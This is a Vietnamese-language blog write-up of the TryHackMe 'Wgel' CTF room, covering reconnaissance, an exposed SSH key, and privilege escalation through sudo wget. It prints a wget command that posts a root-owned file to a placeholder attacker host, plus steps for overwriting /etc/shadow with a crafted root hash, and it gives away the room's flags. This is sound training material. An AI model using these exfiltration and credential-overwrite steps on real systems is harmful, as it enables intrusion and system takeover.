<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content=0x5h1n0k0><link href=https://0x5h1n0k0.github.io/tryhackme/room/wgelctf/ rel=canonical><link rel=icon href=../../../assets/favicon.png><meta name=generator content="mkdocs-1.5.2, mkdocs-material-8.3.9"><title>CTF Wgel | 0x5h1n0k0</title><link rel=stylesheet href=../../../assets/stylesheets/main.1d29e8d0.min.css><link rel=stylesheet href=../../../assets/stylesheets/cur.css><link rel=stylesheet href=../../../assets/stylesheets/footer.scss><link rel=stylesheet href=../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Code"}</style><link rel=stylesheet href=../../../stylesheets/extra.css><script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-XXXXXXXXXX",{page_path:e.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script><link rel=stylesheet href=../../../overrides/assets/stylesheets/main.82a244a8.min.css><!-- live 2d --><link href=https://r18-nmsl.cn/pio/pio.css rel=stylesheet type=text/css><!-- <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
    <script src="https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script> --></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#ctf-wgel class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../.. title=0x5h1n0k0 class="md-header__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 0x5h1n0k0 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> CTF Wgel </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title=0x5h1n0k0 class="md-nav__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> 0x5h1n0k0 </label> <div class=md-nav__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> PINNED <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PINNED data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> PINNED </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../cve/ class=md-nav__link> CVE </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_2 type=checkbox id=__nav_1_2> <label class=md-nav__link for=__nav_1_2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=2> <label class=md-nav__title for=__nav_1_2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../notes/privilege-escalation/linux/ class=md-nav__link> Linux Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../../notes/privilege-escalation/windows/ class=md-nav__link> Windows Privilege Escalation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../notes/reverse-shell/ class=md-nav__link> Reverse Shell Cheatsheet </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> Try Hack Me <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Try Hack Me" data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Try Hack Me </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../ class=md-nav__link> Machines </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> 247CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=247CTF data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> 247CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../247ctf/ class=md-nav__link> Web </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../dvwa/ class=md-nav__link> DVWA </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#pentest-scenario class=md-nav__link> Pentest scenario </a> <nav class=md-nav aria-label="Pentest scenario"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#reconnaissance class=md-nav__link> Reconnaissance </a> </li> <li class=md-nav__item> <a href=#init-access class=md-nav__link> Init Access </a> </li> <li class=md-nav__item> <a href=#privilege-escalation class=md-nav__link> Privilege Escalation </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#some-problems class=md-nav__link> Some problems </a> <nav class=md-nav aria-label="Some problems"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#etcshadow class=md-nav__link> /etc/shadow </a> </li> <li class=md-nav__item> <a href=#etcpasswd class=md-nav__link> /etc/passwd </a> </li> <li class=md-nav__item> <a href=#etccrontab class=md-nav__link> /etc/crontab </a> </li> <li class=md-nav__item> <a href=#etcsudoers class=md-nav__link> /etc/sudoers </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#what-we-learned class=md-nav__link> What we learned </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <aside class=mdx-author> </aside> <div class=tags-items style="color: var(--md-default-fg-color--light); padding-bottom: 10px; opacity: 0.9">Tags</div> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/room/wgelctf/index.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg> </a> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/tryhackme/room/wgelctf/index.md title="View source of this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.15 8.15 0 0 1-1.23-2Z"/></svg> </a> <nav class=md-tags> <a href=../../../tags/tags/#thm-room class=md-tag> THM-Room </a> <a href=../../../tags/tags/#privilege-escalation class=md-tag> Privilege Escalation </a> </nav> <h1 id=ctf-wgel><strong>CTF Wgel</strong><a class=headerlink href=#ctf-wgel title="Permanent link">&para;</a></h1><p style="color:#bdbdbd"><i>Estimated time to read: 12 minutes</i></p>
 <p>Room at <a href=https://tryhackme.com/room/wgelctf>https://tryhackme.com/room/wgelctf</a></p> <hr> <details class=question> <summary>List of the questions solved</summary> <p>Question: User flag</p> <blockquote> <p>057c67131c3d5e42dd5cd3075b198ff6</p> </blockquote> <p>Question: Root flag</p> <blockquote> <p>b1b968b37519ad1daa6408188649263d</p> </blockquote> </details> <h2 id=pentest-scenario><strong>Pentest scenario</strong><a class=headerlink href=#pentest-scenario title="Permanent link">&para;</a></h2> <p>Host: 10.10.157.188</p> <blockquote> <p>Đây là một challenge thuộc loại easy nhưng khá độc đáo về hướng tiếp cận và nó khá hay nên tôi sẽ nói nhiều hơn một xíu</p> </blockquote> <h3 id=reconnaissance><strong>Reconnaissance</strong><a class=headerlink href=#reconnaissance title="Permanent link">&para;</a></h3> <p>Như các challenge khác, ta cũng scan một vài thứ như port, dir,... bằng nmap, gosbuter,...</p> <div class=highlight><span class=filename>Nmap scan NULL</span><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=n>PORT</span>   <span class=n>STATE</span>         <span class=n>SERVICE</span>
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a><span class=n>22</span><span class=p>/</span><span class=n>tcp</span> <span class=n>open</span><span class=p>|</span><span class=n>filtered</span> <span class=n>ssh</span>
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=n>80</span><span class=p>/</span><span class=n>tcp</span> <span class=n>open</span><span class=p>|</span><span class=n>filtered</span> <span class=n>http</span>
</code></pre></div> <div class=highlight><span class=filename>Gobuster scan</span><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=p>/</span><span class=n>sitemap</span>              <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span>
</code></pre></div> <p> <figure><img src=image.png><figcaption>Hình ảnh website</figcaption> </figure> </p> <p>Website này được build bởi WordPress và dùng Colorlib template.</p> <p>Ta vào website OSINT vài thứ thì thấy trang Contact Us như bên dưới</p> <p> <figure><img src=image-1.png><figcaption>Contact Us</figcaption> </figure> </p> <p>Nhìn có vẻ khai thác được gì đó, nhưng sau một vài phép thử input trong các box, và xem tab network thì đây chỉ là 1 trang vô hại mà thôi :V. Đi theo hướng khai thác này là hỏng</p> <p>Website này bắt đầu từ sitemap, tiếp tục scan tiếp</p> <blockquote> <p>Đây là 1 website build khá chỉnh chu nên scan gobuster tốn thời gian lắm, dirbuster cho nhanh. </p> </blockquote> <p> <figure><img src=image-2.png><figcaption>Dirbuster scan</figcaption> </figure> </p> <p>Lúc này mới xuất hiện vấn đề :3. Ta thấy xuất hiện khá nhiều dir nhưng chẳng có thể khai thác được gì tại vì chính cái wordlist ta thường dùng không có database cho file <code>hidden</code>. Ta phải dùng wordlist khác (cái này hay nè).</p> <p><div class=highlight><span class=filename>Gobuster scan</span><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=p>===============================================================</span>
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a><span class=p>/.</span><span class=n>hta</span>                 <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>277</span><span class=p>]</span>
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a><span class=p>/.</span><span class=n>htaccess</span>            <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>277</span><span class=p>]</span>
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a><span class=p>/.</span><span class=n>htpasswd</span>            <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>403</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>277</span><span class=p>]</span>
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a><span class=p>/.</span><span class=n>ssh</span>                 <span class=p>(</span><span class=n>Status</span><span class=p>:</span> <span class=n>301</span><span class=p>)</span> <span class=p>[</span><span class=n>Size</span><span class=p>:</span> <span class=n>319</span><span class=p>]</span>  <span class=p>[--&gt;</span> <span class=n>http</span><span class=p>://</span><span class=n>xx</span><span class=p>.</span><span class=n>xx</span><span class=p>.</span><span class=n>xxx</span><span class=p>.</span><span class=n>xxx</span><span class=p>/</span><span class=n>sitemap</span><span class=p>/.</span><span class=n>ssh</span><span class=p>/]</span>
</code></pre></div> Rồi, có được key ssh rồi</p> <blockquote> <p>Thử dùng john để crack password nhen :3</p> </blockquote> <p>Giờ tìm username, tìm đâu ra?</p> <p>Ta sẽ kiểm tra sourcecode web từng cái, và username nó nằm ở cái website ban đầu ::)</p> <p> <figure><img src=image-3.png><figcaption>Jessie</figcaption> </figure> </p> <h3 id=init-access><strong>Init Access</strong><a class=headerlink href=#init-access title="Permanent link">&para;</a></h3> <p>Login bằng ssh thôi</p> <blockquote> <p>ssh -i id_rsa jessie@10.10.157.188 </p> </blockquote> <p> <figure><img src=image-4.png><figcaption>Sudo -l</figcaption> </figure> </p> <p>Rồi ngon luôn, được cái quyền sudo wget</p> <h3 id=privilege-escalation><strong>Privilege Escalation</strong><a class=headerlink href=#privilege-escalation title="Permanent link">&para;</a></h3> <p>Thông thường gặp leo quyền sudo như vầy, mọi người sẽ có xu hướng lên <a href=https://gtfobins.github.io/gtfobins/wget>https://gtfobins.github.io/gtfobins/wget</a> và lấy command về chạy. Thì với bài này, ta làm như thế nó không work.</p> <p>Đối với ngữ cảnh của challenge trên TryHackMe, dễ dàng ta biết được file root.txt nằm trong /root/root.txt. Do đó ta có thể lấy được file này dễ dàng bằng wget </p> <details class=success> <summary>Cách lấy</summary> <p>Tại máy jessie</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=n>sudo</span> <span class=nb>wget </span><span class=p>-</span><span class=n>-post</span><span class=o>-file</span><span class=p>=/</span><span class=n>root</span><span class=p>/</span><span class=n>root_flag</span><span class=p>.</span><span class=n>txt</span> <span class=n>ATTACKER_IP</span><span class=p>:</span><span class=n>ATTACKER_PORT_LISTEN</span>
</code></pre></div> <p>Tại máy attacker</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=n>nc</span> <span class=n>-lnvp</span> <span class=n>ATTACKER_PORT_LISTEN</span>
</code></pre></div> </details> <p>Nhưng cái quan trọng của ta là leo quyền root.</p> <p> <figure><img src=image-5.png><figcaption>Chỉnh sửa file sudoers</figcaption> </figure> </p> <h2 id=some-problems><strong>Some problems</strong><a class=headerlink href=#some-problems title="Permanent link">&para;</a></h2> <p>Nói về việc leo quyền với wget thì ta có nhiều hướng tiếp cận, vì ta có thể linh động trong việc vận chuyển và sửa đổi các file nhạy cảm như <code>passwd, shadow, crontab,...</code> hay đặc biệt hơn là file sudoers.</p> <p>Việc tôi xếp loại file passwd trước file shadow nhưng lại trình bày sau file shadow (2 chỉ mục bên dưới) đều có ý đồ cả đấy. Bạn thử đoán nhé.</p> <p>Các định nghĩa bên dưới, tôi dùng ChatGPT giải thích.</p> <h3 id=etcshadow><strong>/etc/shadow</strong><a class=headerlink href=#etcshadow title="Permanent link">&para;</a></h3> <p><code>/etc/shadow</code> là một tệp văn bản trong hệ thống Unix và các hệ thống dựa trên Unix (như Linux) được sử dụng để lưu trữ thông tin về mật khẩu của người dùng. Khác với tệp /etc/passwd, tệp /etc/shadow chứa các thông tin về mật khẩu đã được băm (hash) và được sử dụng để xác thực người dùng khi họ đăng nhập vào hệ thống.</p> <p>Cấu trúc của mỗi dòng trong tệp /etc/shadow bao gồm các trường cách nhau bằng dấu hai chấm (":"):</p> <ol> <li> <p>Tên người dùng (Username): Tên đăng nhập duy nhất cho tài khoản người dùng.</p> </li> <li> <p>Mật khẩu (Password): Mật khẩu đã được băm (hash) và được lưu trữ ở đây. Thay vì lưu trữ mật khẩu ở bản rõ, hệ thống lưu trữ một giá trị băm của mật khẩu, là một chuỗi <code>không thể</code> đảo ngược để khôi phục mật khẩu gốc.</p> </li> <li> <p>Ngày thay đổi mật khẩu cuối cùng (Last Password Change): Đây là số ngày tính từ ngày 1/1/1970 (epoch) đến ngày thay đổi mật khẩu cuối cùng. Thông tin này được sử dụng để kiểm tra xem mật khẩu có cần phải thay đổi hay không.</p> </li> <li> <p>Ngày tối thiểu để thay đổi mật khẩu tiếp theo (Minimum Password Age): Số ngày tối thiểu giữa các lần thay đổi mật khẩu.</p> </li> <li> <p>Ngày tối đa để thay đổi mật khẩu tiếp theo (Maximum Password Age): Số ngày tối đa mà một mật khẩu có thể tồn tại trước khi người dùng bắt buộc phải thay đổi.</p> </li> <li> <p>Số ngày cảnh báo trước khi hết hạn mật khẩu (Password Expiry Warning): Số ngày trước khi mật khẩu hết hạn, người dùng sẽ được cảnh báo.</p> </li> <li> <p>Số ngày sau khi hết hạn mật khẩu mà tài khoản vẫn còn hoạt động (Account Inactivity): Số ngày mà tài khoản có thể tồn tại sau khi mật khẩu đã hết hạn.</p> </li> <li> <p>Ngày hết hạn tài khoản (Account Expiry Date): Ngày mà tài khoản sẽ hết hạn và không thể sử dụng nữa.</p> </li> <li> <p>Tài khoản bị khóa (Account Disabled): Trường này xác định xem tài khoản có bị khóa hay không.</p> </li> </ol> <p><code>/etc/shadow</code> được bảo vệ cẩn thận và chỉ có quyền truy cập hạn chế cho người dùng root hoặc các quản trị viên hệ thống. Điều này giúp bảo vệ thông tin mật khẩu của người dùng khỏi việc truy cập trái phép.</p> <p>Tuy ta không có quyền xem file /etc/shadow nhưng ta lại có quyền sudo wget. Do đó, ta có thể dùng wget để tạo kết nối nhằm dùng john để tìm password của root trong file /etc/shadow nhưng hướng này bruteforce không ra password, nên tôi không để vào ngữ cảnh triển khai.</p> <p>Thực ra hướng này ta có thể đoán từ đầu là không thể kể từ lúc bruteforce không ra password từ id_rsa key rồi.</p> <p>Nhưng mà khoan, ta có thể cài đặt password mới cho root mà, đúng không?</p> <details class=note> <summary>script.py</summary> <div class=highlight><span class=filename>Script tạo password abc cho root</span><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=kn>import</span> <span class=nn>crypt</span>
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a><span class=n>crypt</span><span class=o>.</span><span class=n>crypt</span><span class=p>(</span><span class=s1>&#39;abc&#39;</span><span class=p>)</span>
</code></pre></div> <p>output: <code>$6$Datncmm.PBBQkKys$5WA2bUtuR6eEXngZIQDMKSXZ8woGOWeXn85GeoCexca8FOapBGA5HKAGRlhkm3P.qrd5bMwgvJazlBAli5rWo1</code></p> </details> <p>Oke giờ ta sẽ tạo cho root password là <code>abc</code> và ghi vào file shadow</p> <p> <figure><img src=image-7.png><figcaption>shadow</figcaption> </figure> </p> <p>Vận chuyển file shadow đến máy jessie</p> <details class=success> <summary>Cách vận chuyển</summary> <p>Tại máy attacker</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=n>python3</span> <span class=n>-m</span> <span class=n>http</span><span class=p>.</span><span class=n>server</span>
</code></pre></div> <p>Tại máy jessie</p> <div class=highlight><span class=filename>Terminal</span><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=n>sudo</span> <span class=nb>wget </span><span class=n>ATTACKER_IP</span><span class=p>:</span><span class=n>ATTACKER_PORT_LISTEN</span><span class=p>/</span><span class=n>shadow</span> <span class=p>-</span><span class=n>-output-document</span><span class=p>=</span><span class=n>shadow</span>
